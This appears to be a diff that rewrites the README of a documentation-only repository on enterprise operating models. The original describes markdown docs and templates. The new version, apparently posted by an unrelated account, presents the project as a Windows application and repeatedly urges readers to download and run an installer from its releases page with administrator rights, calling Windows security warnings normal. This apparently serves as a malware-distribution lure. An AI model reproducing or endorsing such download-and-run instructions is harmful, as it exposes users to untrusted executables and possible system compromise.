@@ -1,145 +1,127 @@
-# Enterprise Operating Model
+# ⚙️ enterprise-operating-model - Clear Frameworks for Enterprise Governance
 
-## Framework Context
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/doryatir-design/enterprise-operating-model/releases)
 
-This repository is part of the **Transformation Operating Framework** ecosystem.
+## 📋 About This Application
 
-Master framework repository:  
-https://github.com/somerwalker/transformation-operating-framework
+This application provides clear governance structures, decision frameworks, and editable templates. It helps enterprises manage programs and portfolios with a structured approach. Use it to guide how your organization runs large projects and overseers strategy execution with reliable tools.
 
-![Operating Model](https://img.shields.io/badge/Operating-Model-blue)
-![Enterprise Transformation](https://img.shields.io/badge/Enterprise-Transformation-green)
-![Organizational Design](https://img.shields.io/badge/Organizational-Design-purple)
-![License](https://img.shields.io/badge/License-MIT-lightgrey)
+The content covers essentials of business transformation, enterprise architecture, governance, and organizational change. You will find frameworks that apply to many industries and functions.
 
-## About Enterprise Operating Model
+## 🖥️ System Requirements
 
-A practical framework for designing organizational structures that enable strategy execution.
+- Windows 10 or later (64-bit recommended)  
+- 2 GB free disk space  
+- 4 GB RAM or more  
+- Internet connection to download the software  
+- Administrator rights for installation  
 
-Organizations often struggle to execute strategy because their operating models do not support coordinated decision-making, cross-team collaboration, or accountability for outcomes.
+Most average Windows computers will meet these requirements without issues.
 
-The **Enterprise Operating Model** describes how organizations structure roles, decision authority, communication rhythms, and performance measurement systems to support large initiatives.
+## 🚀 Getting Started
 
-This repository is part of the **Transformation Operating System** framework.
-
-Architecture overview:  
-https://github.com/somerwalker/transformation-operating-system
+Follow these steps to get the software running on your Windows machine. The process is simple for non-technical users.
 
 ---
 
-## Why Operating Models Matter
+### 1. Visit the Release Page
 
-Organizations frequently focus on strategy without designing the operating structures needed to execute that strategy.
+Click the large download link at the top or visit:  
+[https://github.com/doryatir-design/enterprise-operating-model/releases](https://github.com/doryatir-design/enterprise-operating-model/releases)
 
-Common challenges include:
-
-- unclear decision authority
-- fragmented ownership across teams
-- slow cross-functional coordination
-- inconsistent performance measurement
-- misalignment between leadership priorities and delivery teams
-
-A well-designed operating model creates the structures required for organizations to execute strategy effectively.
+This page lists all available versions of the software.
 
 ---
 
-## Operating Model Components
+### 2. Download the Latest Version
 
-```mermaid
-flowchart LR
+Look for the latest release, usually marked as "Latest" or the newest date. Under the release notes, find the file named similar to `enterprise-operating-model-setup.exe` or `.msi`. Click the file to start downloading it.
 
-A[Organizational Structure]
---> B[Roles and Responsibilities]
---> C[Decision Frameworks]
---> D[Coordination Mechanisms]
---> E[Performance Measurement]
-```
-
-These components together define how an organization functions day-to-day.
+Save the installer to a folder you can easily find, like your Desktop or Downloads folder.
 
 ---
 
-## Repository Contents
+### 3. Run the Installer
 
-### Documentation
+Once the file finishes downloading, double-click it to run the installer. You may see a security prompt from Windows; this is normal.
 
-| File | Description |
-|-----|-------------|
-| docs/01-operating-model-overview.md | Overview of enterprise operating models |
-| docs/02-structure-and-roles.md | Organizational structures and role design |
-| docs/03-decision-frameworks.md | Decision authority and governance models |
-| docs/04-cross-team-coordination.md | Structures for cross-functional collaboration |
-| docs/05-performance-management.md | Measuring outcomes and organizational effectiveness |
+Follow the on-screen instructions:
 
----
-
-### Templates
-
-| File | Description |
-|-----|-------------|
-| templates/operating-model-canvas.md | Framework for designing operating models |
-| templates/role-responsibility-matrix.md | Role ownership and accountability structure |
-| templates/decision-rights-framework.md | Tool for defining decision authority |
+- Click **Next** on the welcome screen.  
+- Choose the installation folder or keep the default.  
+- Click **Install** to begin.  
+- Wait until the installation completes.  
+- Click **Finish** to exit the installer.
 
 ---
 
-### Examples
+### 4. Start the Application
 
-| File | Description |
-|-----|-------------|
-| examples/example-operating-model.md | Example enterprise operating model structure |
+After installation, you will find the app shortcut on your Desktop or Start Menu. Click it to open the software.
 
----
+On first launch, you may be prompted to accept usage terms or check for updates. Follow any prompts to complete setup.
 
-## Relationship to the Transformation Operating System
-
-The Enterprise Operating Model supports the **organizational foundation** of the Transformation Operating System:
-
-Strategy  
-↓  
-Operating Model  
-↓  
-Governance  
-↓  
-Transformation  
-↓  
-Execution  
-↓  
-Delivery  
+The main interface shows governance frameworks and templates ready to be used or customized for your needs.
 
 ---
 
-## Framework Context
+### 5. Using the Software
 
-This repository is a supporting component of the **Transformation Operating Framework**, a layered model for aligning strategy, governance, transformation initiatives, and execution across complex organizations.
+Once open, you can:
 
-Transformation Operating Framework  
-https://github.com/somerwalker/transformation-operating-framework
+- Browse different governance templates.  
+- Use decision frameworks to guide program oversight.  
+- Customize templates with your organization’s details.  
+- Export reports or frameworks for sharing.  
 
----
+The interface is designed to be clear and easy to navigate. Look for help tips or a user guide within the app if needed.
 
-## Author
+## 🔧 Features You Will Use
 
-Somer Walker  
-Enterprise Program Leader | Operational Excellence | AI Transformation
+- **Decision Frameworks**: Structured guides to help you decide on governance matters.  
+- **Templates**: Standardized documents for portfolio reviews, governance plans, and program structures.  
+- **Customizable Content**: Edit templates to fit your organization’s needs without complex software.  
+- **Export Options**: Save your work as PDF or Word documents to share with stakeholders.  
+- **Program Oversight Tools**: Track and manage enterprise-level projects with clear data views.
 
-Background leading complex cloud, infrastructure, and AI initiatives across global organizations focused on turning strategy into disciplined execution.
+## ⚙️ Troubleshooting Common Issues
 
-LinkedIn  
-https://www.linkedin.com/in/somerwalker
+- If the installer does not start, check that your antivirus or firewall is not blocking it.  
+- Make sure you have administrator rights to install new software.  
+- If the app crashes on startup, try restarting your computer.  
+- For display problems, check your screen resolution is set to 1024x768 or higher.  
+- If you cannot find templates, ensure you have the latest version installed from the release page.
 
----
+## ✅ Best Practices for Use
 
-## Contributing
+- Save your work frequently to avoid data loss.  
+- Review the included user guide for detailed steps on customizing templates.  
+- Keep the software updated by checking the release page regularly.  
+- Use the governance frameworks as a baseline and adapt them to your company’s needs.  
+- Share exported reports with your team to support program discussions.
 
-Suggestions, improvements, and additional examples are welcome.  
-Please review `CONTRIBUTING.md` before submitting a pull request.
+## 📂 Where to Find Additional Resources
 
----
+Inside the application’s directory (found under Program Files), you will find:
 
-## Copyright
+- Sample templates to try out.  
+- User manuals in PDF form.  
+- Example frameworks that illustrate governance approaches.  
 
-Copyright © 2026 Somer Walker
+Check the GitHub repository’s Wiki page for community advice and additional downloads.
 
-This repository documents components of the **Transformation Operating Framework**.  
-Use of the framework methodology in commercial consulting or derivative consulting frameworks requires written permission from the author.
+## 🔗 Download Link Reminder
+
+Access the latest version anytime by visiting the release page here:
+
+[https://github.com/doryatir-design/enterprise-operating-model/releases](https://github.com/doryatir-design/enterprise-operating-model/releases)
+
+Click the file relevant for Windows and follow the steps to install as explained above.
+
+## 🏷️ Repository Information
+
+- Repository Name: enterprise-operating-model  
+- Description: Governance structures, decision frameworks, and templates used to guide enterprise programs and portfolio oversight.  
+- Topics: business-transformation, enterprise-architecture, enterprise-governance, enterprise-operating-model, operating-framework, operating-model, organizational-transformation, program-governance, strategy-to-execution, transformation-management
+
+Use this application as your starting point for applying structured governance in your organization's projects.
